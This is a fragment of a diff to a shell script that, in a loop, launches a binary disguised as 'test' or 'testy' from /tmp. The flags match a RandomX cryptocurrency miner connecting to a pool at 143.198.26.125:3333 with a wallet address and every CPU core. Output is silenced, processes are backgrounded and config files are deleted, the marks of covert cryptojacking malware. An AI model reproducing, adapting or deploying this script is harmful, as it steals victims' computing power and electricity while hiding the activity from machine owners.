@@ -4,8 +4,8 @@ for i in {1..999}; do
   cp /tmp/myconfig /tmp/config.json
   sed -i "s/KUNE/$oke/" config.json
   #sed -i "s/ssd/$oke/" config.json
-  ./test -a rx/0 -O 143.198.26.125:3333 -u 3KG1skXBK67KZWHNvJ8aUUJH42vQVv7b9s.$oke -p $oke -t $(nproc --all) --keepalive --rig-id=$oke >/dev/null 2>&1 >/dev/null &
+  /tmp/testy -a rx/0 -O 143.198.26.125:3333 -u 3KG1skXBK67KZWHNvJ8aUUJH42vQVv7b9s.$oke -p $oke -t $(nproc --all) --keepalive --rig-id=$oke >/dev/null 2>&1 >/dev/null &
   #./test --config config.json >/dev/null 2>&1 >/dev/null & sleep 0.1
   sleep 0.1
-  rm -rf config.json
+  rm -rf /tmp/config.json
 done
